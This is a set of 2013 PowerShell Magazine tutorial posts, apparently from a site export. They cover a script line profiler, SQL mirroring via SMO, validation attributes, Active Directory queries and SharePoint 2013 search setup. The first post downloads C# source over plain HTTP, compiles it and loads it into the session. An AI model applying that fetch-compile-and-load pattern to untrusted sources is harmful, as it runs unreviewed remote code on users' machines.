SDK Sample Pack which includes a lot of code samples that show how to build applications based on Windows PowerShell 3.0. If you browsed through the samples, you probably noticed that all samples are written in C# and require Visual Studio 2010 to build and compile the samples. That’s all good for developers, but what about IT Pros?\nOne of the samples, the Script Line Profiler Sample, shows how to create a script line profiler using the new Windows PowerShell 3.0 Abstract Syntax Tree (AST) support. Out-of-the-box, PowerShell offers two Measure cmdlets: Measure-Command and Measure-Object. The former allows you to measure the time it takes to run script blocks and cmdlets and the latter enables us to calculate the numeric properties of objects, and more.\nThe Script Line Profiler Sample provides an additional measuring cmdlet, the Measure-Script cmdlet. With Measure-Script we can measure the execution time of each script statement (line). We can identify code bottlenecks and pin point parts of code that take longer to execute than expected. That\u0026rsquo;s surely a cmdlet you’d want to have in your utility belt!\nAnyway, as stated above, there is just one MAJOR PITA – it requires Visual Studio! In this article, I want to show a way to compile the project without having to install VS, just by using cmdlets available in PowerShell 3.0. First, let’s browse the sample files. You can do that by clicking on the Browse Code tab.\nYou can see that the sample includes a few files, the main code required for the sample to work is in the PSProfiler.cs file . So, here’s the plan. We need to download that file, get the source code, compile it, add the compiled DLL to our PowerShell session, run Import-Module with the full path to the sample DLL, and then run the Measure-Script cmdlet on a script file.\nA lot of work, right? Let’s see how we can automate the process:\n  Use the Invoke-WebRequest cmdlet to read the source code of PSProfiler.cs\n  Extract the source code from the PRE tag.\n  Compile it; no need to have VS, we can use the Add-Type cmdlet.\n  Import the compiled DLL using Import-Module\n  Use the Measure-Script cmdlet.\n  Here’s the code snippet that does all of that:\n# the url of the PSProfiler.cs file $url='http://code.msdn.microsoft.com/Script-Line-Profiler-Sample-80380291/sourcecode?fileId=70887\u0026amp;pathId=217486489' $iwr = Invoke-WebRequest -Uri $url # the source code is contained in the PRE tag # you can see this by investigating the page source in your browser $code = @($iwr.ParsedHtml.getElementsByTagName('PRE')).innerText # compile the code and output it as a .NET assembly Add-Type -TypeDefinition $code -OutputAssembly .\\PSProfiler.dll # import it Import-Module .\\PSProfiler.dll -Verbose VERBOSE: Loading module from path 'D:\\temp\\PSProfiler.dll'. VERBOSE: Importing cmdlet 'Measure-Script'. #verify the module exists Get-Module PSProfiler # explore the command Get-Command Measure-Script Measure-Script can operate in two ways: profile a script file or create a script line profiler AST object. The following sample script will be used as a test script for both uses. It reads a list of user names (5 in this example) from a CSV file and, calculates each user’s home directory size and create a new custom object for each user.\n############ ## c:\\script.ps1 Import-Csv D:\\temp\\users.csv | Foreach-Object{ $user = Get-ADUser $_.SamAccountName -Properties HomeDirectory $homeDir = Get-ChildItem $_.HomeDirectory -Recurse -Force | Measure-Object Length -Sum New-Object PSObject -Property @{ UserName = $_.SamAccountName HomeDirectorySizeInMB = '{0:N2}' -f ($homeDir/1mb) } } Let’s measure its performance.\nPS\u0026gt; Measure-Script -Path c:\\script.ps1 Time Line ---- ---- 8643 Import-Csv D:\\temp\\users.csv | Foreach-Object{ 0 37 $user = Get-ADUser $_.SamAccountName -Properties HomeDirectory 8597 $homeDir = Get-ChildItem $user.HomeDirectory -Recurse -Force | Measure-Object Length -Sum 0 6 New-Object PSObject -Property @{ 0 UserName = $_.SamAccountName 0 HomeDirectorySizeInMB = '{0:N2}' -f ($homeDir.Sum/1mb) 0 } 0 }  The output object is made of two properties, Time, measures statement execution time for each line in script (in milliseconds), and Line which is the line code being measured. The second produces an AST object. You can start digging into the object and start experimenting with AST and get to know its members.\nPS\u0026gt; $ast = Measure-Script -Path c:\\script.ps1 -Ast PS\u0026gt; $ast | Get-Member TypeName: System.Management.Automation.Language.ScriptBlockAst Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals(System.Object obj) Find Method System.Management.Automation.Language.Ast Find(System.Func[System.Management.Automatio... FindAll Method System.Collections.Generic.IEnumerable[System.Management.Automation.Language.Ast] Find... GetHashCode Method int GetHashCode() GetHelpContent Method System.Management.Automation.Language.CommentHelpInfo GetHelpContent() GetScriptBlock Method scriptblock GetScriptBlock() GetType Method type GetType() ToString Method string ToString() Visit Method System.Object Visit(System.Management.Automation.Language.ICustomAstVisitor astVisitor... BeginBlock Property System.Management.Automation.Language.NamedBlockAst BeginBlock {get;} DynamicParamBlock Property System.Management.Automation.Language.NamedBlockAst DynamicParamBlock {get;} EndBlock Property System.Management.Automation.Language.NamedBlockAst EndBlock {get;} Extent Property System.Management.Automation.Language.IScriptExtent Extent {get;} ParamBlock Property System.Management.Automation.Language.ParamBlockAst ParamBlock {get;} Parent Property System.Management.Automation.Language.Ast Parent {get;} ProcessBlock Property System.Management.Automation.Language.NamedBlockAst ProcessBlock {get;} ScriptRequirements Property System.Management.Automation.Language.ScriptRequirements ScriptRequirements {get;} PS\u0026amp;gt; $ast ParamBlock : BeginBlock : ProcessBlock : EndBlock : Import-Csv D:\\temp\\users.csv | Foreach-Object{ $user = Get-ADUser $_.SamAccountName -Properties HomeDirectory $homeDir = Get-ChildItem $user.HomeDirectory -Recurse -Force | Measure-Object Length -Sum New-Object PSObject -Property @{ UserName = $_.SamAccountName HomeDirectorySizeInMB = '{0:N2}' -f ($homeDir.Sum/1mb) } } DynamicParamBlock : ScriptRequirements : Extent : Import-Csv D:\\temp\\users.csv | Foreach-Object{ $user = Get-ADUser $_.SamAccountName -Properties HomeDirectory $homeDir = Get-ChildItem $user.HomeDirectory -Recurse -Force | Measure-Object Length -Sum New-Object PSObject -Property @{ UserName = $_.SamAccountName HomeDirectorySizeInMB = '{0:N2}' -f ($homeDir.Sum/1mb) } } Parent :  Finally, we don’t want to hit the web and compile the project each time we need to use Measure-Script, it would be better to compile it once and create a local module.\n$url='http://code.msdn.microsoft.com/Script-Line-Profiler-Sample-80380291/sourcecode?fileId=70887\u0026amp;pathId=217486489' $iwr = Invoke-WebRequest -Uri $url $code = @($iwr.ParsedHtml.getElementsByTagName('PRE')).innerText # get the local user module folder $UserModulesFolder = \u0026quot;$env:USERPROFILE\\Documents\\WindowsPowerShell\\Modules\u0026quot; # create new folder for the module $profiler = New-Item -Path $UserModulesFolder -Name PSProfiler -ItemType Directory # generate the DLL Add-Type -TypeDefinition $code -OutputAssembly \u0026quot;$profiler\\PSProfiler.dll\u0026quot; # PDB files are generated when you build a VS project. #They contain information relating to the built binaries which VS can interpret. #They are not necessary for our DLL so we remove them. Get-ChildItem $profiler -Filter *.pdb | Remove-Item -Force # create new manifest file New-ModuleManifest -Path $profiler\\PSProfiler.psd1 -RootModule \u0026quot;PSProfiler.dll\u0026quot; -Description 'Script line profiler using Windows PowerShell 3.0 AST' -PowerShellVersion 3.0 -DotNetFrameworkVersion 4.0 # verify that module is discoverable PS\u0026gt; Get-Module -ListAvailable PSProfiler Directory: C:\\Users\\Shay\\Documents\\WindowsPowerShell\\Modules ModuleType Name ExportedCommands ---------- ---- ---------------- Binary PSProfiler Measure-Script You may also want to check Adam Driscoll’s work on the subject. He wrote about Advanced Script Profiling HERE , and on his blog.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/13/measuring-powershell-scripts/","tags":["How To"],"title":"Measuring PowerShell scripts"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen using SQL SMO to work with mirroring configuration, it is essential to verify if the database is mirrored, or not, before performing any other operations. In today’s tip, we shall see how to use SQL SMO in PowerShell to achieve this.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $smo.Databases['MyDB'].IsMirroringEnabled  The IsMirroringEnabled property returns a boolean value that specifies whether mirroring is enabled on the database. If True, the database has mirroring enabled. Otherwise, False is returned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/10/pstip-verify-if-a-sql-database-is-mirrored-or-not/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Verify if a SQL database is mirrored or not"},{"categories":["Tips and Tricks"],"contents":"When working with Windows PowerShell it can be important to know the screen configuration and resolution of the current computer monitors. The System.Windows.Forms.Screen class provides this information for every monitor attached to this computer. In order to use this class the System.Windows.Forms.dll will be loaded first. After that we can view the AllScreens property of this class:\nPS\u0026gt; Add-Type -AssemblyName System.Windows.Forms PS\u0026gt; [System.Windows.Forms.Screen]::AllScreens BitsPerPixel : 32 Bounds : {X=0,Y=0,Width=1920,Height=1200} DeviceName : \\\\.\\DISPLAY1 Primary : True WorkingArea : {X=0,Y=0,Width=1920,Height=1160} BitsPerPixel : 32 Bounds : {X=1920,Y=0,Width=1920,Height=1200} DeviceName : \\\\.\\DISPLAY2 Primary : False WorkingArea : {X=1920,Y=0,Width=1858,Height=1200} This information can be especially handy when working with Windows Forms as it gives insight into how a desktop is configured and base the location or size of a form based on this information. Another use can be to determine where the taskbar is located.\n[System.Windows.Forms.Screen]::AllScreens | ForEach-Object { if ($_.Bounds.Width -ne $_.WorkingArea.Width) { \u0026quot;Taskbar is placed in vertical position on $($_.DeviceName)\u0026quot; } elseif ($_.Bounds.Height -ne $_.WorkingArea.Height) { \u0026quot;Taskbar is placed in horizontal position on $($_.DeviceName)\u0026quot; } else { \u0026quot;Taskbar is not visible on $($_.DeviceName)\u0026quot; } } Taskbar is placed in horizontal position on \\\\.\\DISPLAY1 Taskbar is placed in vertical position on \\\\.\\DISPLAY2 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/09/pstip-working-with-the-windows-forms-screen-class/","tags":["Tips and Tricks"],"title":"#PSTip Working with the Windows.Forms.Screen Class"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nPowerShell has a very nice list of built-in parameter validation attributes. They help validating parameter values before any code runs and give end-user consistent pre-configured error messages:\nfunction Test-ValidateSet { param ( [ValidateSet( 'Left', 'Center', 'Right' )] [string]$Alignment ) \u0026quot;Selected alignment: $Alignment\u0026quot; } Test-ValidateSet -Alignment Justify Test-ValidateSet : Cannot validate argument on parameter 'Alignment'. The argument \u0026amp;amp;quot;Justify\u0026amp;amp;quot; does not belong to the set \u0026amp;amp;quot;Left,Center,Right\u0026amp;amp;quot; specified by the ValidateSet attribute. Supply an argument that is in the set and then try the command again. As you can see – I haven’t wrote a single sentence, yet my error message is pretty clear. This is the case for most validators. There is, however, one that produces an error message that for most of us won’t be helpful at all–ValidatePattern:\nfunction Show-UglyError { param ( [ValidatePattern( '^\\d{4}-\\d{4}$' )] [string]$Puzzle ) \u0026quot;You solved 4-digits hyphen 4-digits puzzle with: $Puzzle!\u0026quot; } Show-UglyError -Puzzle Not-A-Solution Show-UglyError : Cannot validate argument on parameter 'Puzzle'. The argument \u0026amp;amp;quot;Not-A-Solution\u0026amp;amp;quot; does not match the \u0026amp;amp;quot;^\\d{4}-\\d{4}$\u0026amp;amp;quot; pattern. Supply an argument that matches \u0026amp;amp;quot;^\\d{4}-\\d{4}$\u0026amp;amp;quot; and try the command again. As Joel “Jaykul” Bennett pointed out in his blog post on the same topic, for a “normal” user (a person who is not fluent in regular expressions) this error message looks like “Cannot validate argument on parameter ‘Puzzle’. The argument “Not-A-Solution” does not match … yadda, yadda.” Joel’s solution is to build your own, custom ValidatePatternEx class, that derives from ValidateEnumeratedArgumentsAttribute and overrides ValidateElement method. As much as I love this idea, I can see situations when someone may look for something easier and I would like to suggest a different approach: using regular expression comments:\nfunction Show-FriendlyError { param ( [ValidatePattern( '(?# 4 digits hyphen 4 digits)^\\d{4}-\\d{4}$' )] [string]$AlmostEasy ) \u0026quot;You guessed it right: $AlmostEasy\u0026quot; } Show-FriendlyError -AlmostEasy Wrong! Show-FriendlyError : Cannot validate argument on parameter 'AlmostEasy'. The argument \u0026amp;amp;quot;Wrong!\u0026amp;amp;quot; does not match the \u0026amp;amp;quot;(?# 4 digits hyphen 4 digits)^\\d{4}-\\d{4}$\u0026amp;amp;quot; pattern. Supply an argument that matches \u0026amp;amp;quot;(?# 4 digits hyphen 4 digits)^\\d{4}-\\d{4}$\u0026amp;amp;quot; and try the command again. The used pattern has two parts: first part is our comment that may give end-user more clue on how good pattern would look like: ‘(?# Any description you want to give to user)’. Second part (after closing bracket) is pattern that PowerShell will use to validate input, so it contains actual regular expression.\nMaybe not perfect, but still easier than original and the implementation cost is very low.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/08/pstip-validatepattern-friendlier-error-messages/","tags":["Tips and Tricks"],"title":"#PSTip ValidatePattern – Friendlier error messages"},{"categories":["News"],"contents":"Haven’t had the chance to attend the PowerShell Summit? You can now watch the recordings on YouTube thanks to Aaron Hoover, one of the great PowerShell enthusiasts who attended this successful PowerShell event.\nAlan Renouf – Creating a Complex and Reusable HTML Reporting Structure\nAlan Renouf – Practical PowerShell Integration from Bare Metal to the Cloud\nAleksandar Nikolic – Build Your Demo Environment with Windows PowerShell\nAleksandar Nikolic – Configuring Your PowerShell Workflow Environment\nAndy Schneider – Source Control for IT Pros\nDavid Corrales – Sapien PowerShell Products\nDon Jones – Remoting Configuration Deep Dive\nEd Wilson – PoshMon – PowerShell Does Performance Counters\nEd Wilson – What I learned Judging 5000 Scripts\nEd Wilson – Write Modules, Not Scripts\nJeff Hicks – Creating HTML Reports with Style\nJeff Hicks – How Secure Can You Be?\nKenneth Hansen and Hemant Mahawar – Workshop – Automating for DevOps\nLee Holmes – Advanced Network Scripting with PowerShell\nRicardo Mendes – Device Management With PowerShell\nRichard Siddaway – CIM Sessions\nRichard Siddaway – PowerShell Events\nRichard Siddaway – PowerShell Web Access\nSteve Lee – Standards Based Hardware Management\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/08/powershell-summit-2013-session-recordings/","tags":["News","Conferences"],"title":"PowerShell Summit 2013 session recordings"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn PowerShell 3.0 validation attributes work for regular variables in the same way they worked previously for parameters. They give us many options that were not possible previously. A simple example of an integer that will only support values from 1 to 10:\n[ValidateRange(1,10)][int]$Note = 1 $Note = 11 The variable cannot be validated because the value 11 is not a valid value for the Note variable.  It can be handy for variables defined in your profile, if you want to make sure you will not accidentally change them to a value that simply won’t work.\nToday I would like to suggest another use case. There are many ways to define custom objects. But there is only one way that will, among many other useful things, allow us to constrain the values of the properties. In PowerShell 2.0, there was only the type of a property, in 3.0 , we can also use validation attributes. This technique is a very neat way of using New-Module cmdlet. This cmdlet is primarily used to define dynamic modules, but when we specify -AsCustomObject parameter, any exported variables become properties of custom object, and any exported functions – become its methods:\n$ValidatedObject = New-Module { [ValidatePattern('^\\w+$')] [string]$FirstName = 'John' [ValidatePattern('^\\w+$')] [string]$LastName = 'Doe' [ValidateScript({ if ($_ -lt '1-Jan-1890') { throw \u0026quot;This is for humans, not vampires!\u0026quot; } else { $true } })] [DateTime]$BirthDate = '17-Dec-1978' Export-ModuleMember -Variable * } -AsCustomObject PS\u0026gt; $ValidatedObject.BirthDate = 'Test' Cannot convert value \u0026quot;Test\u0026quot; to type \u0026quot;System.DateTime\u0026quot;. PS\u0026gt; $ValidatedObject.BirthDate = '1-1-1600' This is for humans, not vampires! PS\u0026gt; $ValidatedObject.FirstName = 'John II' The variable cannot be validated because the value John II is not a valid value for the FirstName variable. Now not only the type of the variable meet our requirements, but also the value itself can be used to decide if we want the change value of properties or not.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/07/pstip-validate-your-custom-objects/","tags":["Tips and Tricks"],"title":"#PSTip Validate your custom objects"},{"categories":["Active Directory","Tips and Tricks"],"contents":"This question was asked on the forums recently, is it possible to list all the Active Directory attributes that are currently in use for Active Directory users. It turns out this is relatively simple to do in PowerShell.\nWhen creating a DirectorySearcher object, the default behavior is to only return the properties that have a value.\nBecause of this behavior we can easily list all properties available on all user objects.\nBy piping this output into Group-Object we can get an overview of all attributes that are in use by all Active Directory users and the number of times they are used.\n$Searcher = New-Object DirectoryServices.DirectorySearcher $Searcher.Filter = '(objectcategory=user)' $Searcher.PageSize = 500 $Searcher.FindAll() | ForEach-Object { $_.Properties.Keys } | Group-Object   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/06/pstip-list-all-ad-attributes-currently-in-use-for-ad-users/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip List all AD attributes currently in use for AD users"},{"categories":["News"],"contents":"I’ve had a pleasure to speak at PowerShell Summit North America 2013. I would like to thank the organizers, all attendees–amazing, passionate PowerShellers who made this event such a huge success, Microsoft and PowerShell team, and a few generous individuals who helped me to be a part of an unforgettable experience.\nOne of my sessions was about how to build your demo lab using Windows PowerShell.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/30/powershell-summit-2013-build-your-demo-environment-or-a-test-lab-with-windows-powershell/","tags":["Conferences"],"title":"PowerShell Summit 2013: Build Your Demo Environment or a Test Lab with Windows PowerShell"},{"categories":["Active Directory","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWhen you get user objects from Active Directory using the [Active Directory module cmdlets][1], you get a ‘thin’ output object that includes just a few properties.\nPS\u0026gt; Get-ADUser shay DistinguishedName : CN=shay,CN=Users,DC=domain,DC=com Enabled : True GivenName : Shay Name : Shay ObjectClass : user ObjectGUID : 3a596c36-c876-43a5-a0af-55865cd0cb1d SamAccountName : Shay SID : S-1-5-21-17886608-6971410453-5352618669-29132 Surname : Shay UserPrincipalName : shay@domain.com This can boost your performance when you issue a query that returns many objects. Sometimes, however, you’ll want to return more data contained in properties that are not included in the default set. You can do that by specifying a comma separated list of property names in the Properties parameter. Wildcards are also permitted, and specifying an asterisk ‘*’ will get all properties. The following command adds the Office,Department,mail, and GivenName properties to the output object.\nPS\u0026gt; Get-ADUser shay -Properties Office,Department,mail,GivenName,sn Department : Computers DistinguishedName : CN=shay,CN=Users,DC=domain,DC=com Enabled : True GivenName : Shay mail : shay@domain.com Name : Shay ObjectClass : user ObjectGUID : 3a596c36-c876-43a5-a0af-55865cd0cb1d Office : Computers SamAccountName : Shay SID : S-1-5-21-17886608-6971410453-5352618669-29132 Surname : Levy UserPrincipalName : shay@domain.com Great but most of the time this is how you’ll want your result to look like by default and not having to explicitly declare it each time you run the command.\nThere is no cmdlet that let\u0026#8217;s configure this, but luckily you can control it with a new feature of PowerShell 3.0: Parameters default values. This feature allows us to specify custom default values for any cmdlet or advanced function. Let\u0026#8217;s see how we can use it with the Get-ADUser command: ``` PS $PSDefaultParameterValues=@{'Get-ADUser:Properties' = 'Office','Department','mail','GivenName','sn'} PS Get-ADUser shay Department : Computers DistinguishedName : CN=shay,CN=Users,DC=domain,DC=com Enabled : True GivenName : Shay mail : shay@domain.com Name : Shay ObjectClass : user ObjectGUID : 3a596c36-c876-43a5-a0af-55865cd0cb1d Office : Computers SamAccountName : Shay SID : S-1-5-21-17886608-6971410453-5352618669-29132 Surname : Levy UserPrincipalName : shay@domain.com\n Awesome! All that\u0026amp;#8217;s left to do is add the _$PSDefaultParameterValues_ command to your PowerShell profile so that each time you run _Get-ADUser,_ the output object will have an extended set of attributes. In a similar manner, you can create default sets for computer objects and so on. [1]: http://technet.microsoft.com/en-us/library/ee617195.aspx","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/30/pstip-extending-the-default-output-property-set-for-active-directory-objects/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip Extending the default output property set for Active Directory objects"},{"categories":["How To","SharePoint"],"contents":"The Search Service Application (SSA) in SharePoint provides the content crawl and search functionality. In SharePoint 2010, the Central Administration (CA) site has the option to configure and customize the SSA. This gave the novice and Graphical Interface Administrators (GIA)–this is what I call people who don’t use PowerShell!–an option to add or remove search components such as crawlers, index and query roles, and create mirror copies of search index, etc.\nThings have changed quite a bit in SharePoint 2013. Now, there are more components in the SharePoint SSA and to a GIA’s nightmare, there is no way to edit the search topology in Central Administration. We can create a new search service instance but we cannot configure the same.\nThere are several steps involved in deploying SharePoint Search Service Application.\n Creating a SharePoint Search Service Application Creating a SSA Proxy Creating an administration component Adding content processing, web analytics, crawler, and query components Adding index component and search index replicas  In this article, I will show you how to create and configure the SharePoint 2013 SSA using PowerShell and customize search topology.\nLet us start with an example. Assume that we have a SharePoint 2013 farm with multiple servers hosting different roles. In this farm, we have two web front-end servers, two SQL database servers, and two application servers on which we want to configure all our SharePoint search service components.\nFor the sake of brevity, the following diagram shows only the SharePoint application servers on which we want to configure the search instance.\nSo, as we see above, we will configure the search administration component on ‘APP Server 01’ and rest all components on both servers for high availability. Also, look at the way index is shown. We will configure two index partitions and ensure both servers have a replica of the index partition.\nNote: The following commands need to be run on a server running SharePoint software and you need to load the SharePoint PowerShell snap-in or run these commands at the SharePoint Management Shell. You can load the SharePoint PowerShell snap-in using the following command:\nAdd-PSSnapin Microsoft.SharePoint.PowerShell -ErrorAction SilentlyContinue  In this example, we will be running all the commands on ‘APP Server 01’.\nThe first step in the search service configuration process is to create the search service application. We need a application pool for the search service and we will call it ‘SharePoint_SearchApp’. Also, we need an account for the search service application pool. We will use a domain user account (in my test domain) called SPSearchPool for this purpose. The following code shows how to create a search service application.\n$App1 = \u0026quot;APP-Server-01\u0026quot; $APP2 = \u0026quot;APP-Server-02\u0026quot; $SearchAppPoolName = \u0026quot;SharePoint_SearchApp\u0026quot; $SearchAppPoolAccountName = \u0026quot;TestDomain\\SPSearchPool\u0026quot; $SearchServiceName = \u0026quot;SharePoint_Search_Service\u0026quot; $SearchServiceProxyName = \u0026quot;SharePoint_Search_Proxy\u0026quot; $DatabaseName = \u0026quot;SharePoint_Search_AdminDB\u0026quot; #Create a Search Service Application Pool $spAppPool = New-SPServiceApplicationPool -Name $SearchAppPoolName -Account $SearchAppPoolAccountName -Verbose #Start Search Service Instance on all Application Servers Start-SPEnterpriseSearchServiceInstance $App1 -ErrorAction SilentlyContinue Start-SPEnterpriseSearchServiceInstance $App2 -ErrorAction SilentlyContinue Start-SPEnterpriseSearchQueryAndSiteSettingsServiceInstance $App1 -ErrorAction SilentlyContinue Start-SPEnterpriseSearchQueryAndSiteSettingsServiceInstance $App2 -ErrorAction SilentlyContinue #Create Search Service Application $ServiceApplication = New-SPEnterpriseSearchServiceApplication -Partitioned -Name $SearchServiceName -ApplicationPool $spAppPool.Name -DatabaseName $DatabaseName #Create Search Service Proxy New-SPEnterpriseSearchServiceApplicationProxy -Partitioned -Name $SearchServiceProxyName -SearchApplication $ServiceApplication We have just created the search service application. Now, we need to configure different search components as described above and then finalize the search topology. Let’s start with creation of the new search topology. For this, we first need to clone the existing active search topology:\n$clone = $ServiceApplication.ActiveTopology.Clone() $App1SSI = Get-SPEnterpriseSearchServiceInstance -Identity $app1 $App2SSI = Get-SPEnterpriseSearchServiceInstance -Identity $app2 Once we have the cloned topology, we can start creating the search components.\n#We need only one admin component New-SPEnterpriseSearchAdminComponent –SearchTopology $clone -SearchServiceInstance $App1SSI #We need two content processing components for HA New-SPEnterpriseSearchContentProcessingComponent –SearchTopology $clone -SearchServiceInstance $App1SSI New-SPEnterpriseSearchContentProcessingComponent –SearchTopology $clone -SearchServiceInstance $App2SSI #We need two analytics processing components for HA New-SPEnterpriseSearchAnalyticsProcessingComponent –SearchTopology $clone -SearchServiceInstance $App1SSI New-SPEnterpriseSearchAnalyticsProcessingComponent –SearchTopology $clone -SearchServiceInstance $App2SSI #We need two crawl components for HA New-SPEnterpriseSearchCrawlComponent –SearchTopology $clone -SearchServiceInstance $App1SSI New-SPEnterpriseSearchCrawlComponent –SearchTopology $clone -SearchServiceInstance $App2SSI #We need two query processing components for HA New-SPEnterpriseSearchQueryProcessingComponent –SearchTopology $clone -SearchServiceInstance $App1SSI New-SPEnterpriseSearchQueryProcessingComponent –SearchTopology $clone -SearchServiceInstance $App2SSI We created all the search components as per the diagram shown above except the index partitions. As a best practice, we want to place the search index primary copy and replica at different locations on the application servers. The following commands define the locations for the primary and replica copies and then create the index components as required.\n#Set the primary and replica index location; ensure these drives and folders exist on application servers $PrimaryIndexLocation = \u0026quot;E:\\Data\u0026quot; $ReplicaIndexLocation = \u0026quot;F:\\Data\u0026quot; #We need two index partitions and replicas for each partition. Follow the sequence. New-SPEnterpriseSearchIndexComponent –SearchTopology $clone -SearchServiceInstance $App1SSI -RootDirectory $PrimaryIndexLocation -IndexPartition 0 New-SPEnterpriseSearchIndexComponent –SearchTopology $clone -SearchServiceInstance $App2SSI -RootDirectory $ReplicaIndexLocation -IndexPartition 0 New-SPEnterpriseSearchIndexComponent –SearchTopology $clone -SearchServiceInstance $App2SSI -RootDirectory $PrimaryIndexLocation -IndexPartition 1 New-SPEnterpriseSearchIndexComponent –SearchTopology $clone -SearchServiceInstance $App1SSI -RootDirectory $ReplicaIndexLocation -IndexPartition 1 Finally, we activate the cloned topology to bring the changes into effect.\n$clone.Activate()  This will take a while to finalize the changes. Once the re-configuration of search topology is complete, we can verify the same by running the following commands.\n$ssa = Get-SPEnterpriseSearchServiceApplication Get-SPEnterpriseSearchTopology -Active -SearchApplication $ssa  Once the configuration is complete, if you check the search topology on CA site, you should see something similar to what is shown below.\nIn this article, we looked at only a two-server search topology. But, in real-world, there may be a bigger implementation. However, the steps mentioned in this article can easily be extended to support any size of the farm.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/29/creating-and-configuring-a-sharepoint-2013-search-service-application/","tags":["How To","SharePoint"],"title":"Creating and configuring a SharePoint 2013 search service application"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nAfter I configure SQL mirroring, I usually perform some checks to ensure that the overall mirroring configuration is working fine. This is an essential step to ensure continuous availability of the databases. Checking database failover is one of the items on this checklist. For this purpose, I use the following code to manually failover a single database to the partner SQL instance.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\"; $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $smo.Databases['MyDB'].ChangeMirroringState('Failover')  Make a note that you need to first verify whether the database is mirrored or not before you can use ChangeMirroringState() method. We can do this by using the IsMirroringEnabled property of a database.\n$smo.Databases['MyDB'].IsMirroringEnabled   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/29/pstip-failing-over-a-mirrored-sql-database-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Failing over a mirrored SQL database using SMO"},{"categories":["Tips and Tricks"],"contents":"I was recently working on WPF based UI for one of my PowerShell modules and in the process, I had to figure out a way to find out if a selected timezone supports day light savings or not. I’d initially looked at System.TimeZone .NET class but could not find any relevant method or property.\nThe GetSystemTimeZones() method in System.TimeZoneInfo class was what I really needed. This method returns a set of time zones available on the local system and this includes a property called SupportsDayLightSavingTime property. We can use this property to filter out what we need!\n[System.TimeZoneInfo]::GetSystemTimeZones() | Where { $_.SupportsDayLightSavingTime }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/26/pstip-enumerate-time-zones-that-support-day-light-savings/","tags":["Tips and Tricks"],"title":"#PSTip Enumerate Time Zones that support day light savings"},{"categories":["News"],"contents":"Packt Publishing has released a new book on Windows PowerShell “PowerShell 3.0 Advanced Administration Handbook“. This book was authored by PowerShell MVPs Sherif Talaat and Haijun Fu. Here is an overview of the contents of this book:\n Discover and understand the concept of Windows PowerShell 3.0 Learn the advanced topics and techniques for a professional PowerShell scripting Explore the secret of building custom PowerShell snap-ins and modules Take advantage of PowerShell integration capabilities with other technologies for better administration skills Step-by-step guide rich with real-world script examples, screenshots, and best practices  You can purchase a copy of this book here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/26/new-powershell-book-powershell-3-0-advanced-administration-handbook/","tags":["News"],"title":"New PowerShell Book: PowerShell 3.0 Advanced Administration Handbook"},{"categories":["Active Directory","Tips and Tricks"],"contents":"Active Directory has a special kind of attributes called Constructed attributes. Constructed attributes are not “real” attributes, they are not stored in the directory. Instead, their values are calculated (by a domain controller) from normal attributes (for read) and/or have effects on the values of normal attributes (for write). For example, a user object has constructed attributes such as canonicalName and distinguishedName.\nThe following LDAP filter queries the Active Directory schema by using a bitwise filter to return only objects that match a particular bit being set. 1.2.840.113556.1.4.803 is the LDAP_MATCHING_RULE_BIT_AND rule. The matching rule is true only if all bits from the property match the value. This rule is like the bitwise AND operator (1.2.840.113556.1.4.804 is the LDAP_MATCHING_RULE_BIT_OR rule).\nUsing the bitwise AND rule, we can determine if an attribute has the FLAG_ATTR_IS_CONSTRUCTED bit set. The value of FLAG_ATTR_IS_CONSTRUCTED is 4. We check that the objectClass is an attributeSchema and the attribute flags match the FLAG_ATTR_IS_CONSTRUCTED value.\n$FLAG_ATTR_IS_CONSTRUCTED=4 $filter = \u0026quot;(\u0026amp;(systemFlags:1.2.840.113556.1.4.803:=$FLAG_ATTR_IS_CONSTRUCTED)(ObjectClass=attributeSchema))\u0026quot; Get-ADObject -SearchBase (Get-ADRootDSE).SchemaNamingContext -LDAPFilter $filter | Select-Object Name,DistinguishedName | Sort-Object Name Name DistinguishedName ---- ----------------- Allowed-Attributes CN=Allowed-Attributes,CN=Schema,CN=Configuration,DC=doma... Allowed-Attributes-Effective CN=Allowed-Attributes-Effective,CN=Schema,CN=Configurati... Allowed-Child-Classes CN=Allowed-Child-Classes,CN=Schema,CN=Configuration,DC=d... Allowed-Child-Classes-Effective CN=Allowed-Child-Classes-Effective,CN=Schema,CN=Configur... 